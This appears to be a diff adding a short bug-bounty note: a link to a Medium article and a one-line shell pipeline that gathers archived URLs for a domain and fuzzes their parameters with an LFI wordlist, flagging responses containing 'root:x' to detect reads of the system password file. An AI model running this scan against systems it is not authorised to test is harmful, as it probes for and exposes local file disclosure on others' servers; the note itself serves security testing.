@@ -1,0 +1,5 @@
+https://medium.com/@theUnixe/find-ssrf-lfi-xss-using-httpx-waybackurls-gf-gau-qsreplace-d90f59eb5055
+
+Follow this command to find LFI :
+
+findomain -t example.com -q | waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done
